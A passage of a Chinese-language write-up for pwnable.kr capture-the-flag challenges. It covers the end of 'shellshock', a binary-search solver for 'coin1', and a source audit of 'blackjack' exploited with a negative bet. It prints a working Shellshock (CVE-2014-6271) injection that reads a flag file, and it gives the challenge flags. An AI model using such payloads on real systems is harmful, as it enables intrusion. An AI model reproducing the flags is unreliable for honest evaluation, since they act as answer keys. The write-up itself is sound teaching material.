shellshock@pwnable:~$ env x='() { :;}; echo Fuck' ./bash -c "echo You!"
Fuck
You!
shellshock@pwnable:~$ env x='() { :;}; /bin/cat flag' ./shellshock
only if I knew CVE-2014-6271 ten years ago..!!
Segmentation fault (core dumped)
```

相关链接：[**Shellshock: How does it actually work?**](https://fedoramagazine.org/shellshock-how-does-it-actually-work/)

------

### coin1

这是**Pwnable.kr**的第十一个挑战`coin1`，来自**[Toddler's Bottle]**部分。

```bash
Mommy, I wanna play a game!
(if your network response time is too slow, try nc 0 9007 inside pwnable.kr server)

Running at : nc pwnable.kr 9007
```

根据题目描述，先`nc`进靶机看看情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ nc pwnable.kr 9007

        ---------------------------------------------------
        -              Shall we play a game?              -
        ---------------------------------------------------

        You have given some gold coins in your hand
        however, there is one counterfeit coin among them
        counterfeit coin looks exactly same as real coin
        however, its weight is different from real one
        real coin weighs 10, counterfeit coin weighes 9
        help me to find the counterfeit coin with a scale
        if you find 100 counterfeit coins, you will get reward :)
        FYI, you have 60 seconds.

        - How to play - 
        1. you get a number of coins (N) and number of chances (C)
        2. then you specify a set of index numbers of coins to be weighed
        3. you get the weight information
        4. 2~3 repeats C time, then you give the answer

        - Example -
        [Server] N=4 C=2        # find counterfeit among 4 coins with 2 trial
        [Client] 0 1            # weigh first and second coin
        [Server] 20                     # scale result : 20
        [Client] 3                      # weigh fourth coin
        [Server] 10                     # scale result : 10
        [Client] 2                      # counterfeit coin is third!
        [Server] Correct!

        - Ready? starting in 3 sec... -

N=622 C=10
```

简单来说，我们需要在有限的猜测次数下，从一组硬币中找到一枚假币，这应该可以用二分搜索法解决，每次猜出一半可能的硬币。主要问题在于我们需要在`60`秒内找到`100`枚假币。编写`Python`代码进行求解，然而超时啦！

```python
from pwn import *
import re

io = remote('pwnable.kr', 9007)
log.info(io.recv())
for _ in range(100):
    msg = io.recv().decode()
    log.info(msg)
    match = re.findall(r'N=(\d+) C=(\d+)', msg)[0]
    if match:
        N, C = int(match[0]), int(match[1])
    begin, end = 0, N-1
    while begin <= end and C > 0:
        mid = (begin + end) // 2
        guess = ' '.join(str(i) for i in range(begin, mid+1))
        io.sendline(guess.encode('utf-8'))
        weight = int(io.recvline()[:-1])
        if weight % 10 == 0:
            begin = mid + 1
        else:
            end = mid - 1
        C -= 1
    for _ in range(C):
        io.sendline(b'0')
        io.recv()
    io.sendline(str(begin).encode('utf-8'))
    log.info(io.recv())


log.success(io.recvline())  # Congrats! get your flag
flag = io.recvline()  # b1NaRy_S34rch1nG_1s_3asy_p3asy
log.success(flag)
io.close()
```

题目说了如果网络响应时间太慢的话可以`SSH`进入`pwnable.kr`来进行求解，`localhost`就是如此丝滑，一下就算出`flag`啦。

```bash
shellshock@pwnable:~$ mkdir /tmp/t0ur1st
shellshock@pwnable:~$ cd /tmp/t0ur1st
shellshock@pwnable:/tmp/t0ur1st$ vim exp.py
shellshock@pwnable:/tmp/t0ur1st$ python exp.py
[+] Opening connection to localhost on port 9007: Done
[*] 
        ---------------------------------------------------
        -              Shall we play a game?              -
        ---------------------------------------------------
        
        You have given some gold coins in your hand
        however, there is one counterfeit coin among them
        counterfeit coin looks exactly same as real coin
        however, its weight is different from real one
        real coin weighs 10, counterfeit coin weighes 9
        help me to find the counterfeit coin with a scale
        if you find 100 counterfeit coins, you will get reward :)
        FYI, you have 60 seconds.
        
        - How to play - 
        1. you get a number of coins (N) and number of chances (C)
        2. then you specify a set of index numbers of coins to be weighed
        3. you get the weight information
        4. 2~3 repeats C time, then you give the answer
        
        - Example -
        [Server] N=4 C=2     # find counterfeit among 4 coins with 2 trial
        [Client] 0 1         # weigh first and second coin
        [Server] 20            # scale result : 20
        [Client] 3            # weigh fourth coin
        [Server] 10            # scale result : 10
        [Client] 2             # counterfeit coin is third!
        [Server] Correct!
    
        - Ready? starting in 3 sec... -
        
[*] N=798 C=10
[*] Correct! (0)
[*] N=490 C=9
[*] Correct! (1)
[*] N=491 C=9
[*] Correct! (2)
[*] N=694 C=10
[*] Correct! (3)
[*] N=292 C=9
[*] Correct! (4)
[*] N=637 C=10
[*] Correct! (5)
[*] N=216 C=8
[*] Correct! (6)
[*] N=246 C=8
[*] Correct! (7)
[*] N=304 C=9
[*] Correct! (8)
[*] N=416 C=9
[*] Correct! (9)
[*] N=461 C=9
[*] Correct! (10)
[*] N=515 C=10
[*] Correct! (11)
[*] N=531 C=10
[*] Correct! (12)
[*] N=134 C=8
[*] Correct! (13)
[*] N=696 C=10
[*] Correct! (14)
[*] N=476 C=9
[*] Correct! (15)
[*] N=785 C=10
[*] Correct! (16)
[*] N=218 C=8
[*] Correct! (17)
[*] N=732 C=10
[*] Correct! (18)
[*] N=587 C=10
[*] Correct! (19)
[*] N=962 C=10
[*] Correct! (20)
[*] N=675 C=10
[*] Correct! (21)
[*] N=589 C=10
[*] Correct! (22)
[*] N=945 C=10
[*] Correct! (23)
[*] N=706 C=10
[*] Correct! (24)
[*] N=362 C=9
[*] Correct! (25)
[*] N=627 C=10
[*] Correct! (26)
[*] N=50 C=6
[*] Correct! (27)
[*] N=547 C=10
[*] Correct! (28)
[*] N=652 C=10
[*] Correct! (29)
[*] N=118 C=7
[*] Correct! (30)
[*] N=921 C=10
[*] Correct! (31)
[*] N=174 C=8
[*] Correct! (32)
[*] N=675 C=10
[*] Correct! (33)
[*] N=908 C=10
[*] Correct! (34)
[*] N=976 C=10
[*] Correct! (35)
[*] N=353 C=9
[*] Correct! (36)
[*] N=315 C=9
[*] Correct! (37)
[*] N=908 C=10
[*] Correct! (38)
[*] N=156 C=8
[*] Correct! (39)
[*] N=960 C=10
[*] Correct! (40)
[*] N=104 C=7
[*] Correct! (41)
[*] N=200 C=8
[*] Correct! (42)
[*] N=615 C=10
[*] Correct! (43)
[*] N=387 C=9
[*] Correct! (44)
[*] N=825 C=10
[*] Correct! (45)
[*] N=730 C=10
[*] Correct! (46)
[*] N=472 C=9
[*] Correct! (47)
[*] N=358 C=9
[*] Correct! (48)
[*] N=551 C=10
[*] Correct! (49)
[*] N=736 C=10
[*] Correct! (50)
[*] N=702 C=10
[*] Correct! (51)
[*] N=682 C=10
[*] Correct! (52)
[*] N=158 C=8
[*] Correct! (53)
[*] N=166 C=8
[*] Correct! (54)
[*] N=440 C=9
[*] Correct! (55)
[*] N=707 C=10
[*] Correct! (56)
[*] N=656 C=10
[*] Correct! (57)
[*] N=3 C=2
[*] Correct! (58)
[*] N=348 C=9
[*] Correct! (59)
[*] N=476 C=9
[*] Correct! (60)
[*] N=845 C=10
[*] Correct! (61)
[*] N=68 C=7
[*] Correct! (62)
[*] N=255 C=8
[*] Correct! (63)
[*] N=912 C=10
[*] Correct! (64)
[*] N=413 C=9
[*] Correct! (65)
[*] N=948 C=10
[*] Correct! (66)
[*] N=873 C=10
[*] Correct! (67)
[*] N=414 C=9
[*] Correct! (68)
[*] N=472 C=9
[*] Correct! (69)
[*] N=756 C=10
[*] Correct! (70)
[*] N=626 C=10
[*] Correct! (71)
[*] N=859 C=10
[*] Correct! (72)
[*] N=208 C=8
[*] Correct! (73)
[*] N=890 C=10
[*] Correct! (74)
[*] N=694 C=10
[*] Correct! (75)
[*] N=629 C=10
[*] Correct! (76)
[*] N=936 C=10
[*] Correct! (77)
[*] N=41 C=6
[*] Correct! (78)
[*] N=330 C=9
[*] Correct! (79)
[*] N=492 C=9
[*] Correct! (80)
[*] N=655 C=10
[*] Correct! (81)
[*] N=654 C=10
[*] Correct! (82)
[*] N=72 C=7
[*] Correct! (83)
[*] N=737 C=10
[*] Correct! (84)
[*] N=425 C=9
[*] Correct! (85)
[*] N=526 C=10
[*] Correct! (86)
[*] N=361 C=9
[*] Correct! (87)
[*] N=198 C=8
[*] Correct! (88)
[*] N=657 C=10
[*] Correct! (89)
[*] N=509 C=9
[*] Correct! (90)
[*] N=371 C=9
[*] Correct! (91)
[*] N=773 C=10
[*] Correct! (92)
[*] N=260 C=9
[*] Correct! (93)
[*] N=905 C=10
[*] Correct! (94)
[*] N=776 C=10
[*] Correct! (95)
[*] N=379 C=9
[*] Correct! (96)
[*] N=331 C=9
[*] Correct! (97)
[*] N=602 C=10
[*] Correct! (98)
[*] N=632 C=10
[*] Correct! (99)
[+] Congrats! get your flag
[+] b1NaRy_S34rch1nG_1s_3asy_p3asy
[*] Closed connection to localhost port 9007
```

提交 `b1NaRy_S34rch1nG_1s_3asy_p3asy` 即可。

------

### blackjack

这是**Pwnable.kr**的第十二个挑战`coin1`，来自**[Toddler's Bottle]**部分。

```bash
Hey! check out this C implementation of blackjack game!
I found it online
* http://cboard.cprogramming.com/c-programming/114023-simple-blackjack-program.html

I like to give my flags to millionares.
how much money you got?


Running at : nc pwnable.kr 9009
```

题目描述已经给出了这题的`C`语言源程序，进行代码审计。注意到`betting()`函数中存在漏洞。这个函数询问玩家想在这一轮下注多少，然后检查下注金额是否不超过玩家当前拥有的现金数额。然而，该函数不会检查下注金额是否为负数。

```c
int betting() //Asks user amount to bet
{
    printf("\n\nEnter Bet: $");
    scanf("%d", &bet);

    if (bet > cash) //If player tries to bet more money than player has
    {
        printf("\nYou cannot bet more money than you have.");
        printf("\nEnter Bet: ");
        scanf("%d", &bet);
        return bet;
    }
    else return bet;
} // End Function
```

继续审计`play()`函数中的代码，赢钱的逻辑看起来不错，但输钱的逻辑并没有考虑到负赌注的情况。

```c
betting(); //Prompts user to enter bet amount

while(i<=21) // While loop used to keep asking user to hit or stay at most twenty-one times
             // because there is a chance user can generate twenty-one consecutive 1's
{
     if(p==21) //If user total is 21, win
     {
        printf("\nUnbelievable! You Win!\n");
        won = won+1;
        cash = cash+bet;
        printf("\nYou have %d Wins and %d Losses. Awesome!\n", won, loss);
        dealer_total=0;
        askover();
    }
  
    if(p>21) //If player total is over 21, loss
    {
        printf("\nWoah Buddy, You Went WAY over.\n");
        loss = loss+1;
        cash = cash - bet;
        printf("\nYou have %d Wins and %d Losses. Awesome!\n", won, loss);
        dealer_total=0;
        askover();
    }

    if(p<=21) //If player total is less than 21, ask to hit or stay
    {         
        printf("\n\nWould You Like to Hit or Stay?");
          
        scanf("%c", &choice3);
        while((choice3!='H') && (choice3!='h') && (choice3!='S') && (choice3!='s')) // If invalid choice entered
        {                                                                           
            printf("\n");
            printf("Please Enter H to Hit or S to Stay.\n");
            scanf("%c",&choice3);
        }


        if((choice3=='H') || (choice3=='h')) // If Hit, continues
        { 
            randcard();
            player_total = p + l;
            p = player_total;
            printf("\nYour Total is %d\n", p);
            dealer();
            if(dealer_total==21) //Is dealer total is 21, loss
            {
                printf("\nDealer Has the Better Hand. You Lose.\n");
                loss = loss+1;
                cash = cash - bet;
                printf("\nYou have %d Wins and %d Losses. Awesome!\n", won, loss);
                dealer_total=0;
                askover();
            } 
  
            if(dealer_total>21) //If dealer total is over 21, win
            {                      
                printf("\nDealer Has Went Over!. You Win!\n");
                won = won+1;
                cash = cash+bet;
                printf("\nYou have %d Wins and %d Losses. Awesome!\n", won, loss);
                dealer_total=0;
                askover();
            }
        }
        if((choice3=='S') || (choice3=='s')) // If Stay, does not continue
        {
            printf("\nYou Have Chosen to Stay at %d. Wise Decision!\n", player_total);
            stay();
        }
    }
    i++; //While player total and dealer total are less than 21, re-do while loop 
} // End While Loop
```

再来看`stay()`函数，同样没有考虑到赌注为负数的情况。这样看来，我们只需要摆烂就能赢钱，即在发牌后选择留，我们的负赌注将从现金总额中减去（负负得正即我们赚钱）。

```c
void stay() //Function for when user selects 'Stay'
{
    dealer(); //If stay selected, dealer continues going
    if(dealer_total>=17)
    {
        if(player_total>=dealer_total) //If player's total is more than dealer's total, win
        {
            printf("\nUnbelievable! You Win!\n");
            won = won+1;
            cash = cash+bet;
            printf("\nYou have %d Wins and %d Losses. Awesome!\n", won, loss);
            dealer_total=0;
            askover();
        }
        if(player_total<dealer_total) //If player's total is less than dealer's total, loss
        {
            printf("\nDealer Has the Better Hand. You Lose.\n");
            loss = loss+1;
            cash = cash - bet;
            printf("\nYou have %d Wins and %d Losses. Awesome!\n", won, loss);
            dealer_total=0;
            askover();
        }
        if(dealer_total>21) //If dealer's total is more than 21, win
        {
            printf("\nUnbelievable! You Win!\n");
            won = won+1;
            cash = cash+bet;
            printf("\nYou have %d Wins and %d Losses. Awesome!\n", won, loss);
            dealer_total=0;
            askover();
        }
    }
    else
    {
        stay();
    }
} // End Function
```

因此最简单最消极最摆烂的做法就是：

```bash
$ nc pwnable.kr 9009
Y          # Are You Ready? (Y/N)
1          # Enter 1 to Begin the Greatest Game Ever Played.
-5201314   # Enter Bet: a large negative number
S          # Enter S to Stay.
Y          # Enter Y to Play Again.
YaY_I_AM_A_MILLIONARE_LOL   # flag
```

终端的部分显示如下：

```bash
ash: $500
-------
|D    |
|  9  |
|    D|
-------

Your Total is 9

The Dealer Has a Total of 10

Enter Bet: $-5201314


Would You Like to Hit or Stay?
Please Enter H to Hit or S to Stay.
S

You Have Chosen to Stay at 9. Wise Decision!

The Dealer Has a Total of 20
Dealer Has the Better Hand. You Lose.

You have 0 Wins and 1 Losses. Awesome!

Would You Like To Play Again?
Please Enter Y for Yes or N for No
Y
```

输入`Y`之后，在下一局游戏开始前，`flag`会被打印出来：`YaY_I_AM_A_MILLIONARE_LOL`。

```bash
YaY_I_AM_A_MILLIONARE_LOL


Cash: $5201814
-------
|H    |
|  K  |
|    H|
-------

Your Total is 10

The Dealer Has a Total of 11

Enter Bet: $
```

